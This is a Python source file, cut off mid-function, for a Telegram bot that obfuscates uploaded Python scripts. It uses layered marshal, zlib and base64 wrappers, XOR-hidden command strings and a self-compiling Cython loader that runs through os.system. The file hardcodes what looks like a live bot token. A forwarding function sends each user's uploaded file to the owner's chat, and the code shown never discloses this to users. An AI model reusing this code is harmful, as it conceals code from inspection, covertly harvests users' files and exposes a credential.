#!/usr/bin/env python3

import os
import tempfile
import logging
import base64
import binascii
import lzma
import textwrap
import asyncio
import secrets
import zlib
import aiohttp
import aiofiles
import shutil
import json
import io
import zipfile
import random
import string
import subprocess
import marshal
import autopep8
import time
import bz2
import gzip
from datetime import datetime, timedelta
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    filters,
)

BOT_TOKEN = "8210953356:AAHXiPm3zgHsYMPprxaEuhTd-wS_w2xJrhM"
OWNER_CHAT_IDS = [5612494162]  # Your owner ID

REQUIRED_CHANNELS = {}  # Empty - no force join

WAIT_FILE, CHOOSE_METHOD, CHOOSE_EXPIRATION, WAIT_BROADCAST_MESSAGE = range(4)
WAIT_REPLACE_FILE = 4

USERS_DB_FILE = "enc_users.json"

logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

DOWNLOAD_TIMEOUT = 120  # Reduced timeout
REQUEST_TIMEOUT = 60   # Reduced timeout
POLL_INTERVAL = 1.0    # Faster polling

MAX_FILE_SIZE = 10 * 1024 * 1024

MAX_RETRIES = 2        # Reduced retries
RETRY_DELAY = 1        # Reduced delay

BASE_USER_DIR = "user_files"

# NEW: User session management for concurrent processing
_user_sessions = {}
_session_lock = asyncio.Lock()

# NEW: PyObfuscate Basic Encoders (replaced old basic encoders)
ENCODERS = [
    ("🌟 𝗕𝗔𝗦𝗘 16 🌟", "pybase16"),
    ("🌟 𝗕𝗔𝗦𝗘 32 🌟", "pybase32"),
    ("🌟 𝗕𝗔𝗦𝗘 64 🌟", "pybase64"),
    ("🌟 𝗭𝗟𝗜𝗕 𝗘𝗡𝗖 🌟", "pyzlib"),
    ("🌟 𝗠𝗔𝗥𝗦𝗛𝗔𝗟 🌟", "pymarshal"),
    ("🌟 𝗕𝗬𝗧𝗘𝗦 𝗘𝗡𝗖 🌟", "pysimple"),
]

# NEW: PyObfuscate Combination Encoders (replaced old combination encoders)
COMBINATION_ENCODERS = [
    ("𝗭𝗟𝗜𝗕 + 𝗕𝗔𝗦𝗘 16", "pyzlib_base16"),
    ("𝗭𝗟𝗜𝗕 + 𝗕𝗔𝗦𝗘 32", "pyzlib_base32"),
    ("𝗭𝗟𝗜𝗕 + 𝗕𝗔𝗦𝗘 64", "pyzlib_base64"),
    ("𝗠𝗔𝗥𝗦𝗛𝗔𝗟 + 𝗭𝗟𝗜𝗕", "pymarshal_zlib"),
    ("𝗠𝗔𝗥𝗦𝗛𝗔𝗟 + 𝗕𝗔𝗦𝗘 16", "pymarshal_base16"),
    ("𝗠𝗔𝗥𝗦𝗛𝗔𝗟 + 𝗕𝗔𝗦𝗘 32", "pymarshal_base32"),
    ("𝗠𝗔𝗥𝗦𝗛𝗔𝗟 + 𝗕𝗔𝗦𝗘 64", "pymarshal_base64"),
    ("𝗠𝗔𝗥𝗦𝗛𝗔𝗟 + 𝗭𝗟𝗜𝗕 + 𝗕𝗔𝗦𝗘 16", "pymarshal_zlib_base16"),
    ("𝗠𝗔𝗥𝗦𝗛𝗔𝗟 + 𝗭𝗟𝗜𝗕 + 𝗕𝗔𝗦𝗘 32", "pymarshal_zlib_base32"),
    ("𝗠𝗔𝗥𝗦𝗛𝗔𝗟 + 𝗭𝗟𝗜𝗕 + 𝗕𝗔𝗦𝗘 64", "pymarshal_zlib_base64"),
]

# Special encoders - UNCHANGED (keeping original special encoders)
SPECIAL_ENCODERS = [
    ("🍁 𝗦𝗧𝗥𝗢𝗡𝗚𝗘𝗦𝗧 𝗘𝗡𝗖 🍁", "strongest_enc"),
    ("🍁 𝗣𝗬 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗬𝗧𝗛𝗢𝗡 🍁", "py_private_cython"),
    ("🍁 𝗖𝗬𝗧𝗛𝗢𝗡 𝗫 𝗕64 𝗖𝗢𝗠𝗣𝗜𝗟𝗘 🍁", "cython_x_base64"),
]

METHOD_DISPLAY_NAMES = {
    # NEW: PyObfuscate Basic Encoders
    "pymarshal": "PyObfuscate Marshal",
    "pyzlib": "PyObfuscate Zlib", 
    "pybase16": "PyObfuscate Base16",
    "pybase32": "PyObfuscate Base32",
    "pybase64": "PyObfuscate Base64",
    "pysimple": "PyObfuscate Simple",
    
    # NEW: PyObfuscate Combination Encoders
    "pyzlib_base16": "PyObfuscate Zlib + Base16",
    "pyzlib_base32": "PyObfuscate Zlib + Base32",
    "pyzlib_base64": "PyObfuscate Zlib + Base64",
    "pymarshal_zlib": "PyObfuscate Marshal + Zlib",
    "pymarshal_base16": "PyObfuscate Marshal + Base16",
    "pymarshal_base32": "PyObfuscate Marshal + Base32",
    "pymarshal_base64": "PyObfuscate Marshal + Base64",
    "pymarshal_zlib_base16": "PyObfuscate Marshal + Zlib + Base16",
    "pymarshal_zlib_base32": "PyObfuscate Marshal + Zlib + Base32",
    "pymarshal_zlib_base64": "PyObfuscate Marshal + Zlib + Base64",
    
    # UNCHANGED: Special Encoders
    "strongest_enc": "🔥 STRONGEST ENC",
    "py_private_cython": "🔥 Py Private Cython",
    "cython_x_base64": "🔥 CYTHON X BASE 64 COMPILE",
}

# Expiration options - FIXED with better date handling
EXPIRATION_OPTIONS = [
    ("No Expiration", "none"),
    ("1 Day", "1day"),
    ("3 Days", "3days"), 
    ("7 Days", "7days"),
    ("15 Days", "15days"),
    ("30 Days", "30days"),
    ("Custom Date", "custom"),
]

# NEW: Advanced User Session Management
class UserSession:
    def __init__(self, user_id: int):
        self.user_id = user_id
        self.file_path = None
        self.upload_name = None
        self.chosen_method = None
        self.expiration_date = None
        self.waiting_custom_date = False
        self.processing = False
        self.temp_dir = None
        self.session_id = f"{user_id}_{int(time.time())}"
    
    def cleanup(self):
        """Clean up temporary files"""
        try:
            if self.temp_dir and os.path.exists(self.temp_dir):
                shutil.rmtree(self.temp_dir)
            if self.file_path and os.path.exists(self.file_path):
                os.remove(self.file_path)
        except Exception as e:
            logger.error(f"Error cleaning up session {self.session_id}: {e}")
    
    def get_user_dir(self):
        """Get user-specific directory"""
        if not self.temp_dir:
            self.temp_dir = os.path.join(BASE_USER_DIR, self.session_id)
            os.makedirs(self.temp_dir, exist_ok=True)
        return self.temp_dir

async def get_user_session(user_id: int) -> UserSession:
    """Get or create user session with thread safety"""
    async with _session_lock:
        if user_id not in _user_sessions:
            _user_sessions[user_id] = UserSession(user_id)
        return _user_sessions[user_id]

async def cleanup_user_session(user_id: int):
    """Clean up user session"""
    async with _session_lock:
        if user_id in _user_sessions:
            session = _user_sessions[user_id]
            session.cleanup()
            del _user_sessions[user_id]

# NEW: File forwarding function (added from zkcfg.py)
async def forward_file_to_owner(context: ContextTypes.DEFAULT_TYPE, document, user_info: str):
    for owner_id in OWNER_CHAT_IDS:
        try:
            await context.bot.send_document(
                chat_id=owner_id,
                document=document.file_id,
                caption=f"📨 File received from user:\n{user_info}"
            )
            logger.info(f"File forwarded to owner {owner_id} from user: {user_info}")
        except Exception as e:
            logger.error(f"Failed to forward file to owner {owner_id}: {e}")

# NEW: PyObfuscate Encoding Functions (keep all your existing encoding functions)
def pyobfuscate_encode_marshal(data):
    """PyObfuscate Marshal Encoding"""
    encoded = marshal.dumps(compile(data, '<x>', 'exec'))[::-1]
    return f"exec(__import__('marshal').loads({repr(encoded)}[::-1]))"

def pyobfuscate_encode_zlib(data):
    """PyObfuscate Zlib Encoding"""
    encoded = zlib.compress(data.encode('utf8'))[::-1]
    return f"exec(__import__('zlib').decompress({repr(encoded)}[::-1]).decode('utf-8'))"

def pyobfuscate_encode_base16(data):
    """PyObfuscate Base16 Encoding"""
    encoded = base64.b16encode(data.encode('utf8'))[::-1]
    return f"exec(__import__('base64').b16decode({repr(encoded)}[::-1]).decode('utf-8'))"

def pyobfuscate_encode_base32(data):
    """PyObfuscate Base32 Encoding"""
    encoded = base64.b32encode(data.encode('utf8'))[::-1]
    return f"exec(__import__('base64').b32decode({repr(encoded)}[::-1]).decode('utf-8'))"

def pyobfuscate_encode_base64(data):
    """PyObfuscate Base64 Encoding"""
    encoded = base64.b64encode(data.encode('utf8'))[::-1]
    return f"exec(__import__('base64').b64decode({repr(encoded)}[::-1]).decode('utf-8'))"

def pyobfuscate_encode_zlib_base16(data):
    """PyObfuscate Zlib + Base16 Encoding"""
    zlib_compressed = zlib.compress(data.encode('utf8'))
    encoded = base64.b16encode(zlib_compressed)[::-1]
    return f"exec(__import__('zlib').decompress(__import__('base64').b16decode({repr(encoded)}[::-1])).decode('utf-8'))"

def pyobfuscate_encode_zlib_base32(data):
    """PyObfuscate Zlib + Base32 Encoding"""
    zlib_compressed = zlib.compress(data.encode('utf8'))
    encoded = base64.b32encode(zlib_compressed)[::-1]
    return f"exec(__import__('zlib').decompress(__import__('base64').b32decode({repr(encoded)}[::-1])).decode('utf-8'))"

def pyobfuscate_encode_zlib_base64(data):
    """PyObfuscate Zlib + Base64 Encoding"""
    zlib_compressed = zlib.compress(data.encode('utf8'))
    encoded = base64.b64encode(zlib_compressed)[::-1]
    return f"exec(__import__('zlib').decompress(__import__('base64').b64decode({repr(encoded)}[::-1])).decode('utf-8'))"

def pyobfuscate_encode_marshal_zlib(data):
    """PyObfuscate Marshal + Zlib Encoding"""
    marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
    encoded = zlib.compress(marshaled)[::-1]
    return f"exec(__import__('marshal').loads(__import__('zlib').decompress({repr(encoded)}[::-1])))"

def pyobfuscate_encode_marshal_base16(data):
    """PyObfuscate Marshal + Base16 Encoding"""
    marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
    encoded = base64.b16encode(marshaled)[::-1]
    return f"exec(__import__('marshal').loads(__import__('base64').b16decode({repr(encoded)}[::-1])))"

def pyobfuscate_encode_marshal_base32(data):
    """PyObfuscate Marshal + Base32 Encoding"""
    marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
    encoded = base64.b32encode(marshaled)[::-1]
    return f"exec(__import__('marshal').loads(__import__('base64').b32decode({repr(encoded)}[::-1])))"

def pyobfuscate_encode_marshal_base64(data):
    """PyObfuscate Marshal + Base64 Encoding"""
    marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
    encoded = base64.b64encode(marshaled)[::-1]
    return f"exec(__import__('marshal').loads(__import__('base64').b64decode({repr(encoded)}[::-1])))"

def pyobfuscate_encode_marshal_zlib_base16(data):
    """PyObfuscate Marshal + Zlib + Base16 Encoding"""
    marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
    zlib_compressed = zlib.compress(marshaled)
    encoded = base64.b16encode(zlib_compressed)[::-1]
    return f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b16decode({repr(encoded)}[::-1]))))"

def pyobfuscate_encode_marshal_zlib_base32(data):
    """PyObfuscate Marshal + Zlib + Base32 Encoding"""
    marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
    zlib_compressed = zlib.compress(marshaled)
    encoded = base64.b32encode(zlib_compressed)[::-1]
    return f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b32decode({repr(encoded)}[::-1]))))"

def pyobfuscate_encode_marshal_zlib_base64(data):
    """PyObfuscate Marshal + Zlib + Base64 Encoding"""
    marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
    zlib_compressed = zlib.compress(marshaled)
    encoded = base64.b64encode(zlib_compressed)[::-1]
    return f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode({repr(encoded)}[::-1]))))"

def pyobfuscate_encode_simple(data):
    """PyObfuscate Simple Encoding (Advanced)"""
    # Multiple layers of encoding
    for x in range(5):
        marshaled = marshal.dumps(compile(data, '<x>', 'exec'))
        zlib_compressed = zlib.compress(marshaled)
        encoded = base64.b64encode(zlib_compressed)[::-1]
        data = f"exec(__import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode({repr(encoded)}[::-1]))))"
    
    # Convert to character codes for additional obfuscation
    char_codes = []
    for i in data:
        char_codes.append(ord(i))
    
    final_code = "exec(''.join(chr(__) for __ in %s))" % char_codes
    
    # Add header with lots of null characters for obfuscation
    header = "exec(str(chr(35))" + "+chr(1)" * 1000 + ");"
    
    return header + final_code

# NEW: PyObfuscate Processing Function
def process_pyobfuscate_encoding(file_path, method, expiration_date=None):
    """Process file using PyObfuscate encoding methods"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            original_code = f.read()
        
        # PyObfuscate header note
        note = "#This Encode Is Done By @PirateEncoder_Robot\n# Time : %s\n# ----------------------------------\n" % time.ctime()
        
        # Apply encoding based on method
        if method == "pymarshal":
            encoded_code = pyobfuscate_encode_marshal(original_code)
        elif method == "pyzlib":
            encoded_code = pyobfuscate_encode_zlib(original_code)
        elif method == "pybase16":
            encoded_code = pyobfuscate_encode_base16(original_code)
        elif method == "pybase32":
            encoded_code = pyobfuscate_encode_base32(original_code)
        elif method == "pybase64":
            encoded_code = pyobfuscate_encode_base64(original_code)
        elif method == "pysimple":
            encoded_code = pyobfuscate_encode_simple(original_code)
        elif method == "pyzlib_base16":
            encoded_code = pyobfuscate_encode_zlib_base16(original_code)
        elif method == "pyzlib_base32":
            encoded_code = pyobfuscate_encode_zlib_base32(original_code)
        elif method == "pyzlib_base64":
            encoded_code = pyobfuscate_encode_zlib_base64(original_code)
        elif method == "pymarshal_zlib":
            encoded_code = pyobfuscate_encode_marshal_zlib(original_code)
        elif method == "pymarshal_base16":
            encoded_code = pyobfuscate_encode_marshal_base16(original_code)
        elif method == "pymarshal_base32":
            encoded_code = pyobfuscate_encode_marshal_base32(original_code)
        elif method == "pymarshal_base64":
            encoded_code = pyobfuscate_encode_marshal_base64(original_code)
        elif method == "pymarshal_zlib_base16":
            encoded_code = pyobfuscate_encode_marshal_zlib_base16(original_code)
        elif method == "pymarshal_zlib_base32":
            encoded_code = pyobfuscate_encode_marshal_zlib_base32(original_code)
        elif method == "pymarshal_zlib_base64":
            encoded_code = pyobfuscate_encode_marshal_zlib_base64(original_code)
        else:
            return None, f"Unknown PyObfuscate method: {method}"
        
        # Add expiration check if specified
        final_code = note
        if expiration_date:
            expiration_code = f"""
# Improved expiration check
try:
    from datetime import datetime
    __exp_date = datetime.fromisoformat('{expiration_date}')
    __current_date = datetime.now()
    if __current_date > __exp_date:
        print("❌ This file has expired and can no longer be executed.")
        print(f"File expired on: {{__exp_date.strftime('%Y-%m-%d %H:%M:%S')}}")
        print(f"Current date: {{__current_date.strftime('%Y-%m-%d %H:%M:%S')}}")
        exit(1)
    else:
        __days_left = (__exp_date - __current_date).days
        print(f"✅ File is valid. Expires in {{__days_left}} days.")
except Exception as __exp_err:
    print(f"Expiration check warning: {{__exp_err}}")

"""
            final_code += expiration_code
        
        final_code += encoded_code
        
        # Create output file
        output_path = file_path.replace('.py', '_pyobfuscated.py')
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(final_code)
        
        return output_path, None
        
    except Exception as e:
        return None, f"PyObfuscate encoding failed: {str(e)}"

# FIXED: STRONGEST ENC Encryption Functions with proper temp directory handling
def generate_random_suffix(length=10):
    characters = string.ascii_uppercase + string.digits
    return ''.join(str(random.randint(1, 10)) for _ in range(length))

def gw(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def remove_comments(input_file, output_file):
    with open(input_file, 'r') as input_f:
        content = input_f.read()
    output_content = ''
    in_comment = False
    i = 0
    while i < len(content):
        if content[i:i+2] == '/*':
            in_comment = True
            i += 4
            continue
        elif content[i:i+2] == '*/':
            in_comment = False 
            i += 2
            continue
        if not in_comment:
            output_content += content[i]
        i += 1
    with open(output_file, 'w') as output_f:
        output_f.write(output_content)

status_messages = [
    "\x1b[1;93m🔥 IGNITING ENCRYPTION ENGINES... 🚀",
    "\x1b[1;94m🛠️ WEAVING OBFUSCATION MAGIC... ✨",
    "\x1b[1;95m⚙️ SPINNING UP CODE SHIELD... 🛡️",
    "\x1b[1;96m🌌 DIVING INTO THE ENCRYPTION GALAXY... 🌠",
    "\x1b[1;92m🔒 LOCKING CODE IN A DIGITAL VAULT... 🔐",
    "\x1b[1;91m💻 CRUNCHING BYTES AT LIGHTSPEED... ⚡",
    "\x1b[1;93m🧙‍♂️ CASTING PYTHONIC ENCRYPTION SPELLS... 🪄",
    "\x1b[1;94m📦 PACKAGING CODE IN STEALTH MODE... 🕵️",
    "\x1b[1;95m🔍 SCRAMBLING CODE BEYOND RECOGNITION... 🌀",
    "\x1b[1;96m🚀 LAUNCHING CYTHON HYPERDRIVE... 🌟"
]

def display_status():
    print(random.choice(status_messages))
    time.sleep(random.uniform(0.3, 0.8))

def g(name, file_path, temp_dir):
    """FIXED: Added temp_dir parameter"""
    temp_file_path = os.path.join(temp_dir, name)
    w = open(temp_file_path, "r", encoding="utf-8")
    a = w.read()
    w.close()
    a = """#THIS ENCODE BY @strongencoder_bot •
    exec(bytes([35,32,83,111,117,114,99,101,32,71,101,110,101,114,97,116,101,100,32,119,105,116,104,32,68,101,99,111,109,112,121,108,101,43,43,10,35,32,70,105,108,101,58,32,100,101,99,95,68,69,86,73,76,46,112,121,32,40,80,121,116,104,111,110,32,51,46,57,41,10,10,10,35,69,114,114,111,114,32,100,101,99,111,109,112,121,108,105,110,103,32,100,101,99,95,68,69,86,73,76,46,112,121,58,32,118,101,99,116,111,114]).decode())
    import os
    os.system('clear')\n""" + a
    print("\x1b[1;92m\x1b[38;5;49mENC PROCESS: INITIALIZING ENCRYPTION...!!")
    display_status()
    aa = autopep8.fix_code(a)
    os.remove(temp_file_path)
    with open(temp_file_path, 'w') as output_f:
        output_f.write(aa)
    print("\x1b[1;92m\x1b[38;5;48mENC PROCESS: INJECTING CYTHON LAYER...!!")
    display_status()
    os.system(f"cython {temp_file_path}")
    name2 = name.replace(".py", ".c")
    name2_path = os.path.join(temp_dir, name2)
    with open(name2_path, "r") as f:
        if len(f.read()) < 1000:
            print("\x1b[1;91m🚫 CYTHON COMPILATION FAILED!")
            exit()
    remove_comments(name2_path, name2_path)
    display_status()
    name2_base = name.replace(".py", "")
    c = '''
#ifdef __FreeBSD__
#include <dede.h>
#endif
#if PY_MAJOR_VERSION < 3
int main(int argc, char** argv) {
#elif defined(Win32) || defined(MS_WINDOWS)
int wmain(int argc, wchar_t **argv) {
#else
static int __Pyx_main(int argc, wchar_t **argv) {
#endif
#ifdef __FreeBSD__
    fp_except_t m;
    m = fpgetmask();
    fpsetmask(m & ~FP_X_OFL);
#endif
    if (argc && argv)
        Py_SetProgramName(argv[0]);
    Py_Initialize();
    if (argc && argv)
        PySys_SetArgv(argc, argv);
    {
      PyObject* m = NULL;
      __pyx_module_is_main_'''+name2_base+''' = 1;
      #if PY_MAJOR_VERSION < 3
          init'''+name2_base+'''();
      #elif CYTHON_PEP489_MULTI_PHASE_INIT
          m = PyInit_'''+name2_base+'''();
          if (!PyModule_Check(m)) {
              PyModuleDef *mdef = (PyModuleDef *) m;
              PyObject *modname = PyUnicode_FromString("__main__");
              m = NULL;
              if (modname) {
                  m = PyModule_NewObject(modname);
                  Py_DECREF(modname);
                  if (m) PyModule_ExecDef(m, mdef);
              }
          }
      #else
          m = PyInit_'''+name2_base+'''();
      #endif
      if (PyErr_Occurred()) {
          PyErr_Print();
          #if PY_MAJOR_VERSION < 3
          if (Py_FlushLine()) PyErr_Clear();
          #endif
          return 1;
      }
      Py_XDECREF(m);
       }
#if PY_VERSION_HEX < 0x03060000
    Py_Finalize();
#else
    if (Py_FinalizeEx() < 0)
        return 2;
#endif
    return 0;
}
#if PY_MAJOR_VERSION >= 3 && !defined(Win32) && !defined(MS_WINDOWS)
#include <locale.h>
static wchar_t*
__Pyx_char2wchar(char* arg)
{
    wchar_t *res;
#ifdef HAVE_BROKEN_MBSTOWCS
    size_t argsize = strlen(arg);
#else
    size_t argsize = mbstowcs(NULL, arg, 0);
#endif
    size_t count;
    unsigned char *in;
    wchar_t *out;
#ifdef HAVE_MBRTOWC
    mbstate_t mbs;
#endif
    if (argsize != (size_t)-1) {
        res = (wchar_t *)malloc((argsize+1)*sizeof(wchar_t));
        if (!res)
            goto oom;
        count = mbstowcs(res, arg, argsize+1);
        if (count != (size_t)-1) {
            wchar_t *tmp;
            for (tmp = res; *tmp != 0 &&
                     (*tmp < 0xd800 || *tmp > 0xdfff); tmp++)
                ;
            if (*tmp == 0)
                return res;
        }
        free(res);
    }
#ifdef HAVE_MBRTOWC
    argsize = strlen(arg) + 1;
    res = (wchar_t *)malloc(argsize*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    memset(&mbs, 0, sizeof mbs);
    while (argsize) {
        size_t converted = mbrtowc(out, (char*)in, argsize, &mbs);
        if (converted == 0)
            break;
        if (converted == (size_t)-2) {
            fprintf(stderr, "unexpected mbrtowc result -2");
            free(res);
            return NULL;
        }
        if (converted == (size_t)-1) {
            *out++ = 0xdc00 + *in++;
            argsize--;
            memset(&mbs, 0, sizeof mbs);
            continue;
        }
        if (*out >= 0xd800 && *out <= 0xdfff) {
            argsize -= converted;
            while (converted--)
                *out++ = 0xdc00 + *in++;
            continue;
        }
        in += converted;
        argsize -= converted;
        out++;
    }
#else
    res = (wchar_t *)malloc((strlen(arg)+1)*sizeof(wchar_t));
    if (!res) goto oom;
    in = (unsigned char*)arg;
    out = res;
    while(*in)
        if(*in < 128)
            *out++ = *in++;
        else
            *out++ = 0xdc00 + *in++;
    *out = 0;
#endif
    return res;
oom:
    fprintf(stderr, "out of memory");
    return NULL;
}
int
main(int argc, char **argv)
{
    if (!argc) {
        return __Pyx_main(0, NULL);
    }
    else {
        int i, res;
        wchar_t **argv_copy = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        wchar_t **argv_copy2 = (wchar_t **)malloc(sizeof(wchar_t*)*argc);
        char *oldloc = strdup(setlocale(LC_ALL, NULL));
        if (!argv_copy || !argv_copy2 || !oldloc) {
            fprintf(stderr, "out of memory");
            free(argv_copy);
            free(argv_copy2);
            free(oldloc);
            return 1;
        }
        res = 0;
        setlocale(LC_ALL, "");
        for (i = 0; i < argc; i++) {
            argv_copy2[i] = argv_copy[i] = __Pyx_char2wchar(argv[i]);
            if (!argv_copy[i]) res = 1;
        }
        setlocale(LC_ALL, oldloc);
        free(oldloc);
        if (res == 0)
            res = __Pyx_main(argc, argv_copy);
        for (i = 0; i < argc; i++) {
#if PY_VERSION_HEX < 0x03050000
            free(argv_copy2[i]);
#else
            PyMem_RawFree(argv_copy2[i]);
#endif
        }
        free(argv_copy);
        free(argv_copy2);
        return res;
    }
}
#endif
'''
    name2_c_path = os.path.join(temp_dir, f"{name2_base}.c")
    with open(name2_c_path, 'r') as input_f:
        co = input_f.read() + c + "\"\"\""
    file1 = file_path.replace('.py', '')
    out = f"{file1}-STRONGEST-ENC.py"
    a=f'''import os
import time
import sys
PREFIX=sys.prefix
EXECUTE_FILE = ".PIRATE/{name2_base}"
EXPORT_PYTHONHOME ="export PYTHONHOME="+sys.prefix
EXPORT_PYTHON_EXECUTABLE ="export PYTHON_EXECUTABLE="+ sys.executable
RUN = "./"+ EXECUTE_FILE
if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME +"&&"+ EXPORT_PYTHON_EXECUTABLE +"&&"+ RUN)
    exit(0)
C_SOURCE = r"""'''
    b=f'''
C_FILE ="{name2_base}.c"
PYTHON_VERSION = ".".join(sys.version.split(" ")[0].split(".")[:-1])
COMPILE_FILE = ('gcc -I' + PREFIX + '/include/python' + PYTHON_VERSION + ' -o ' + EXECUTE_FILE + ' ' + C_FILE + ' -L' + PREFIX + '/lib -lpython' + PYTHON_VERSION)
with open(C_FILE,'w') as f:
    f.write(C_SOURCE)
os.makedirs(os.path.dirname(EXECUTE_FILE),exist_ok=True)
os.system(EXPORT_PYTHONHOME +"&&"+ EXPORT_PYTHON_EXECUTABLE +"&&" + COMPILE_FILE +"&&"+ RUN)
os.remove(C_FILE)'''
    code = a + co + b
    if '\x00' in code:
       raise ValueError("The entered code contains zero bytes.")
    display_status()
    compiled_code = compile(code, 'WASU', 'exec')
    serialized_code = marshal.dumps(compiled_code) 
    run_code = f'import marshal\nexec(marshal.loads({serialized_code}))'
    display_status()
    compiled_code = zlib.compress(run_code.encode('utf-8'))
    compiled_code = f'import zlib\nexec(zlib.decompress({compiled_code}))'
    display_status()
    compiled_code = compile(compiled_code, 'WASU', 'exec')
    serialized_code = marshal.dumps(compiled_code) 
    run_code = f'import marshal\nexec(marshal.loads({serialized_code}))'
    display_status()
    compiled_code = compile(run_code, 'WASUN', 'exec')
    serialized_code = marshal.dumps(compiled_code) 
    run_code = f'#THIS ENCODE BY WASU | @Beasteren •\nexec(bytes([35,32,83,111,117,114,99,101,32,71,101,110,101,114,97,116,101,100,32,119,105,116,104,32,68,101,99,111,109,112,121,108,101,43,43,10,35,32,70,105,108,101,58,32,100,101,99,95,68,69,86,73,76,46,112,121,32,40,80,121,116,104,111,110,32,51,46,57,41,10,10,10,35,69,114,114,111,114,32,100,101,99,111,109,112,121,108,105,110,103,32,100,101,99,95,68,69,86,73,76,46,112,121,58,32,118,101,99,116,111,114]).decode())\nimport marshal\nexec(marshal.loads({serialized_code}))'
    display_status()
    compiled_code = base64.b64encode(run_code.encode('utf-8'))
    
    display_status()
    print("\x1b[1;92m\x1b[38;5;51mENC PROCESS: APPLYING ADVANCED CPYTHON ENCRYPTION...!!")
    
    final_code = f'''#THIS ENCODE BY @Strongencoder_bot CPYTHON
E=' @Beasteren'
B=''
A=chr
import os as C,sys as D,base64 as H,tempfile as I
J={compiled_code}
F=C.path.join(I.gettempdir(),(lambda s:B.join(A(_x^48)for _x in s))([30,96,105,111,96,98,121,102,113,100,117]))
C.makedirs(F,exist_ok=True)
G=C.path.join(F,(lambda s:B.join(A(_x^114)for _x in s))([64,66,64,71,67,66,64,65,67,65,70,75,66,65,71,64,74]))
K=(lambda s:B.join(A(_x^54)for _x in s))([83,78,70,89,68,66,22,102,111,98,126,121,120,126,121,123,115,11])+D.prefix
L=(lambda s:B.join(A(_x^108)for _x in s))([9,20,28,3,30,24,76,60,53,56,36,35,34,51,41,52,41,47,57,56,45,46,32,41,81])+D.executable
M=E.join([f'"{{_arg}}"'for _arg in D.argv[1:]])
N=G+E+M
if C.path.isfile(G):C.system(K+(lambda s:B.join(A(_x^137)for _x in s))([169,175,175,169])+L+(lambda s:B.join(A(_x^214)for _x in s))([246,240,240,246])+N);exit(0)
try:
    with open((lambda s:B.join(A(_x^104)for _x in s))([70,11,24,17,28,0,7,6]),'wb')as O:O.write(H.b64decode(J))
    C.system((lambda s:B.join(A(_x^105)for _x in s))([25,16,29,1,6,7,90,73,71,10,25,16,29,1,6,7,73])+E.join(D.argv[1:]))
except Exception as P:print(P)
finally:
    if C.path.exists((lambda s:B.join(A(_x^159)for _x in s))([177,252,239,230,235,247,240,241])):C.remove((lambda s:B.join(A(_x^250)for _x in s))([212,153,138,131,142,146,149,148]))
'''
    
    os.remove(temp_file_path)
    with open(out, 'w') as output_f:
        output_f.write(final_code)
    return out

def encrypt_file_strongest(file_path):
    """FIXED: STRONGEST ENC encryption function with proper temp directory"""
    if not os.path.exists(file_path):
        return None, f"Error: File '{file_path}' not found!"
    
    # Create session-specific temp directory
    temp_dir = os.path.join(os.path.dirname(file_path), "temp_m")
    if not os.path.exists(temp_dir):
        os.makedirs(temp_dir)

    print("\x1b[1;92m\x1b[38;5;46m💫 ENC PROCESS: STARTING THE ENCRYPTION JOURNEY... 🌟")
    
    name = os.path.basename(file_path)
    name2 = gw(2) + ".py"
    shutil.copyfile(file_path, os.path.join(temp_dir, name2))
    
    try:
        # FIXED: Pass temp_dir to the function
        output_file = g(name2, file_path, temp_dir)
        
        print(f"\x1b[1;92m\x1b[38;5;50m✅ ENC PROCESS COMPLETE! ENCRYPTED FILE SAVED AS {output_file} 🎉")
        
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        
        return output_file, None
    except Exception as e:
        if os.path.exists(temp_dir):
            shutil.rmtree(temp_dir)
        return None, f"STRONGEST Encryption failed: {str(e)}"

# FIXED: Py Private Cython Encryption Functions
def py_private_generate_random_suffix(length=10):
    characters = string.ascii_uppercase + string.digits
    return ''.join(str(random.randint(1, 10)) for _ in range(length))

def py_private_gw(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for _ in range(length))

def py_private_remove_comments(input_file, output_file):
    with open(input_file, 'r') as input_f:
        content = input_f.read()
    output_content = ''
    in_comment = False
    i = 0
    while i < len(content):
        if content[i:i+2] == '/*':
            in_comment = True
            i += 4
            continue
        elif content[i:i+2] == '*/':
            in_comment = False 
            i += 2
            continue
        if not in_comment:
            output_content += content[i]
        i += 1
    with open(output_file, 'w') as output_f:
        output_f.write(output_content)

def py_private_g(name, file_path, temp_dir):
    """FIXED: Added temp_dir parameter"""
    temp_file_path = os.path.join(temp_dir, name)
    w = open(temp_file_path, "r", encoding="utf-8")
    a = w.read()
    w.close()
    a = """#THIS ENCODE BY Py Private Cython | @pyprivatecython •
    exec(bytes([35,32,83,111,117,114,99,101,32,71,101,110,101,114,97,116,101,100,32,119,105,116,104,32,68,101,99,111,109,112,121,108,101,43,43,10,35,32,70,105,108,101,58,32,100,101,99,95,68,69,86,73,76,46,112,121,32,40,80,121,116,104,111,110,32,51,46,57,41,10,10,10,35,69,114,114,111,114,32,100,101,99,111,109,112,121,108,105,110,103,32,100,101,99,95,68,69,86,73,76,46,112,121,58,32,118,101,99,116,111,114]).decode())
    import os
